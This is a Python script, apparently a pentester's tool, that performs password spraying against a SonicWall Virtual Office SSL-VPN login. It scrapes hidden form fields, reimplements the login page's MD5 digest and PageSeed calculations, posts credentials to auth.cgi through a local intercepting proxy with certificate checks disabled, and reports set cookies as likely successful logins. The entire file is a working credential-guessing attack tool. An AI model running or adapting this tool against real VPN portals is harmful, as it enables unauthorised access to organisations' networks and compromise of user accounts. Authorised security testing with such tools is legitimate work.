import bs4
import requests
import urllib3
import hashlib
import argparse

#have to do this to stop the warning messages about untrusted certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def spray(user,password,url):
    
    #need to parameterize these
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
    headers = {'user-agent': 'Mozilla/5.0 (Android 11; Mobile; rv:83.0) Gecko/83.0 Firefox/83.0'}

    post_id=""  #this is the silly little static ID thing (CSRF-ish)
    post_domain="LocalDomain" #this is static, I believe
    post_uName=user #this is the ID you're spraying
    post_Sesspwd=password  #the password you're spraying
    post_SslvpnLoginPage="1" #this is staic, I believe
    post_digest=""
    post_sessid=""
    post_PageSeed=""

    def chapdigest(id,pwd,param1):
        #logic from the javascript pulled from the web interface - this computes the digest param
        #logic is: md5(bytes(id)+characters(pwd)+bytes(param1))
        mylist=[]
        mylist.append((int(id,16)))
        for x in pwd:
            mylist.append(ord(x))
    
        for x in range(0,len(param1),2):
            mylist.append(int(param1[x]+param1[x+1],16))
    
        newstring=''
        for i in mylist:
            newstring+=str(i)
        #print(mylist)

        m = hashlib.md5()
        m.update(bytearray(mylist))
        return(m.hexdigest())
    
    
    def setEncryptSeed(pwd,param2):
        #also logic from javascript pulled from the web interface - this computes the pageseed param
        newstring=(param2+pwd).encode('utf-8')
        m = hashlib.md5()
        m.update(newstring)
        return m.hexdigest()
    
    #request the login page and find/assign hidden fields required for post param processing
    req1 = requests.get(url+"/sslvpnLogin.html", proxies=proxies,headers=headers,verify=False)
    soup = bs4.BeautifulSoup(req1.content,features="lxml")
    req_param1=(soup.find('input',{'name':'param1'}).get('value'))
    req_param2=(soup.find('input',{'name':'param2'}).get('value'))
    req_id=(soup.find('input',{'name':'id'}).get('value'))
    req_sessid=(soup.find('input',{'name':'sessId'}).get('value'))

    #hard-coded values from burp to override in order to test calculations - just uncomment and fill-in values from burp
    #req_id="4b"
    #req_param1="76DCE3780FB214858D8A4692F6117CA7"
    #req_param2="A45CB6A20F1837888436EE7DCF5DDF12"
    #req_sessid="928C419F4C08C5B091A01FB57DF63390"

    post_id=req_id
    post_sessid=req_sessid
    post_PageSeed=setEncryptSeed(post_Sesspwd,req_param2) #compute pageseed param
    post_digest=chapdigest(post_id,post_Sesspwd,req_param1) #compute digest param

    #uncomment these for testing so that you can prove the computed values
#    print("sessid is: "+post_sessid)
#    print("post_PageSeed is: "+post_PageSeed)
#    print("post_digest is: "+post_digest)

    headers = {'User-Agent': 'Mozilla/5.0 (Android 11; Mobile; rv:83.0) Gecko/83.0 Firefox/83.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Accept-Language': 'en-US,en;q=0.5',
               'Cookie': 'temp=; SessId='+post_sessid+'; Sesspwd='+post_Sesspwd+'; PageSeed='+post_PageSeed, 
               'Referer':url+'/sslvpnLogin.html'
              }

    authdata={'id':post_id,'domain':post_domain,
              'uName':post_uName,
              'pass':'',
              'SslvpnLoginPage':post_SslvpnLoginPage,
              'digest':post_digest
             }
          
    req3 = requests.post(url+"/auth.cgi", proxies=proxies,headers = headers, data = authdata,verify=False)
    soup = bs4.BeautifulSoup(req3.content,features='lxml')
    #test contents for success and print result
    cookietest=""
    if "Set-Cookie" in req3.headers:
        cookietest=" *COOKIES SET!! - SUCCESSFUL AUTH?!"
    print(user+":"+password+" - Length: "+str(len(req3.content))+cookietest)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Sonicwall Virtual Office Spray Tool"
    )

    parser.add_argument(
        "-u",
        "--user",
        type=str,
        help="User for auth"
        )

    parser.add_argument(
        "-p",
        "--passwd",
        type=str,
        help="Password for auth"
        )

    parser.add_argument(
        "-url",
        "--url",
        type=str,
        help="Target URL (exa: https://<targethost>:<targetport>)"
        )

#    parser.add_argument(
#        "-U",
#        type=str,
#        help="User file for auth - one username per line."
#        )
    
#    parser.add_argument(
#        "-P",
#        type=str,
#        help="Password file for auth - one password per line."
#        )

    args=parser.parse_args()

    
    if (not args.user or not args.passwd):
        parser.error("Username and password input (-u,-p) required.")
    if (not args.url):
        parser.error("Target URL input (-url) required.")
   # if (not args.u or not args.U):
    #    parser.error("Username input (-u/-U) required")
   # if (not args.p or not args.P):
    #    parser.error("Username input (-u/-U) required")

    spray(args.user,args.passwd,args.url)
